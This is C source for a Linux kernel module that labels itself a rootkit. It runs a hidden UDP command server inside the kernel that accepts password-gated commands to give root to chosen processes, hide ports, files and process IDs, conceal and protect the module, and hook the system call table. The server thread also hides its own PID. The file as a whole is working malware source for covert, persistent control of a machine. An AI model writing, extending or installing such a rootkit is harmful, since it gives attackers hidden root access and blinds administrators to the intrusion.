#include "server.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(MODULE_NAME_);

int cmd_run(const char __user *command, struct sockaddr_in *addr)
{
    size_t length = strlen(command);

    pr_info("get command %s\n", command);

    if (length <= strlen(CFG_PASS) ||
        strncmp(command, CFG_PASS, strlen(CFG_PASS)) != 0)
        return 0;

    pr_info("Password check passed\n");

    // 因为密码验证通过,因此假设以下命令格式正确

    command += strlen(CFG_PASS) + 1;

    if (strncmp(command, CFG_ROOT, strlen(CFG_ROOT)) == 0)
    {
        pr_info("Got root command\n");
        command += strlen(CFG_ROOT) + 1;
        get_root(simple_strtol(command, NULL, 0));
    }
    else if (strncmp(command, CFG_HIDE_PORT, strlen(CFG_HIDE_PORT)) == 0)
    {
        pr_info("Got hideport command\n");
        command += strlen(CFG_HIDE_PORT) + 1;
        add_hideport(simple_strtol(command, NULL, 0));
    }
    else if (strncmp(command, CFG_UNHIDE_PORT, strlen(CFG_UNHIDE_PORT)) == 0)
    {
        pr_info("Got unhideport command\n");
        command += strlen(CFG_UNHIDE_PORT) + 1;
        delete_hideport(simple_strtol(command, NULL, 0));
    }
    else if (strncmp(command, CFG_HIDE_FILE, strlen(CFG_HIDE_FILE)) == 0)
    {
        pr_info("Got hidefile command\n");
        command += strlen(CFG_HIDE_FILE) + 1;
        add_hidefile(command);
    }
    else if (strncmp(command, CFG_UNHIDE_FILE, strlen(CFG_UNHIDE_FILE)) == 0)
    {
        pr_info("Got unhidefile command\n");
        command += strlen(CFG_UNHIDE_FILE) + 1;
        delete_hidefile(command);
    }
    else if (strncmp(command, CFG_HIDE_PID, strlen(CFG_HIDE_PID)) == 0)
    {
        pr_info("Got hidepid command\n");
        command += strlen(CFG_HIDE_PID) + 1;
        add_hidepid(simple_strtol(command, NULL, 0));
    }
    else if (strncmp(command, CFG_UNHIDE_PID, strlen(CFG_UNHIDE_PID)) == 0)
    {
        pr_info("Got unhidepid command\n");
        command += strlen(CFG_UNHIDE_PID) + 1;
        delete_hidepid(simple_strtol(command, NULL, 0));
    }
    else if (strncmp(command, CFG_HIDE, strlen(CFG_HIDE)) == 0)
    {
        pr_info("Got hide command\n");
        my_hide();
    }
    else if (strncmp(command, CFG_UNHIDE, strlen(CFG_UNHIDE)) == 0)
    {
        pr_info("Got unhide command\n");
        my_unhide();
    }
    else if (strncmp(command, CFG_PROTECT, strlen(CFG_PROTECT)) == 0)
    {
        pr_info("Got protect command\n");
        my_protect();
    }
    else if (strncmp(command, CFG_UNPROTECT, strlen(CFG_UNPROTECT)) == 0)
    {
        pr_info("Got unprotect command\n");
        my_unprotect();
    }
    else if (strncmp(command, CFG_LSHOOK, strlen(CFG_LSHOOK)) == 0)
    {
        pr_info("Got lshook command\n");
        lshook();
    }
    else if (strncmp(command, CFG_CLEANLSHOOK, strlen(CFG_CLEANLSHOOK)) == 0)
    {
        pr_info("Got cleanlshook command\n");
        cleanup_lshook();
    }
    else
    {
        pr_info("Got unknown command\n");
    }

    return 1;
}

//********* START COMM CHANNEL *********

static int server_run(void *data)
{
    int size;
    unsigned char buffer[UDP_BUFF];

    kthread->running = 1;
    // 不允许被冻结
    current->flags |= PF_NOFREEZE;

    pr_info("Creating UDP SERVER SOCKET\n");
    if (sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock) < 0)
    {
        pr_info("ERROR IN SOCK_CREATE\n");
        kthread->thread = NULL;
        kthread->running = 0;
        return 0;
    }
    pr_info("Created UDP SERVER SOCKET succeed\n");

    memset(&kthread->addr, 0, sizeof(struct sockaddr));
    kthread->addr.sin_family = AF_INET;
    kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
    kthread->addr.sin_port = htons(UDP_PORT);
    pr_info("Set ADDRESS FAMILY and PORT for UDP SERVER\n");

    if (kthread->sock->ops->bind(kthread->sock,
                                 (struct sockaddr *)&kthread->addr,
                                 sizeof(struct sockaddr)) < 0)
    {
        pr_info("ERROR IN BIND\n");
        sock_release(kthread->sock);
        kthread->sock = NULL;
        kthread->thread = NULL;
        kthread->running = 0;
        return 0;
    }

    pr_info("Run UDP SERVER LOOP\n");

    while (1)
    {
        if (kthread_should_stop())
            break;

        memset(&buffer, 0, UDP_BUFF);
        size = server_receive(kthread->sock, &kthread->addr,
                              buffer, UDP_BUFF);

        if (signal_pending(current))
            break;

        if (size > 0)
            cmd_run((const char *)buffer, &kthread->addr);

        schedule();
    }

    kthread->running = 0;
    return 0;
}

int start_cmd_thread(void)
{
    pr_info("ROOTKIT Starting kernel thread\n");

    // 初始化内核线程
    kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
    kthread->thread = kthread_run(&server_run, NULL, CFG_ROOTKIT_NAME);

    // handling出错
    if (kthread->thread == NULL)
    {
        pr_info("Set SERVER failed!\n");
        kfree(kthread);
        kthread = NULL;
        return 0;
    }

    // 隐藏自身PID
    add_hidepid(kthread->thread->pid);

    pr_info("ROOTKIT Created kernel thread\n");

    return 1;
}

void server_close(void)
{
    pr_info("ROOTKIT Unloading kernel thread\n");

    int err;
    struct pid *pid = find_get_pid(kthread->thread->pid);
    struct task_struct *task = pid_task(pid, PIDTYPE_PID);

    // kill kthread
    if (kthread->thread != NULL)
    {
        err = send_sig(SIGKILL, task, 1);

        if (err > 0)
            while (kthread->running == 1)
                msleep(50);

        pr_info("ROOTKIT kernel thread exit pid %d\n", task->pid);
    }

    // destroy socket
    if (kthread->sock != NULL)
    {
        sock_release(kthread->sock);
        kthread->sock = NULL;
    }
    kfree(kthread);
    kthread = NULL;

    pr_info("ROOTKIT removed kernel thread\n");
}

//********* END COMM CHANNEL *********

//********* START LKM *********

unsigned long long find_sys_call_table(void)
{
    return (unsigned long long)kallsyms_lookup_name("sys_call_table");
}

static int lkm_init(void)
{
    pr_info("module loading...\n");

    sys_call_table = find_sys_call_table();
    pr_info("Found sys_call_table at 0x%llx\n", sys_call_table);

    if (init_hideport())
    {
        pr_info("Hideport is set up\n");
    }

    if (init_hidefile())
    {
        pr_info("Hidefile is set up\n");
    }

    if (init_hidepid())
    {
        pr_info("Hidepid is set up\n");
    }

    if (start_cmd_thread() == 0)
    {
        pr_info("Failed to set up comm channel\n");
        return -1;
    }

    pr_info("Comm channel is set up\n");

    pr_info("module loaded!\n");

    return 0;
}

static void lkm_exit(void)
{
    //****** 以下为清理部分 *********
    server_close();
    cleanup_lshook();
    cleanup_hideport();
    cleanup_hidefile();
    cleanup_hidepid();
    //******* 以上为清理部分 *********

    pr_info("module removed!\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

//********* END LKM *********
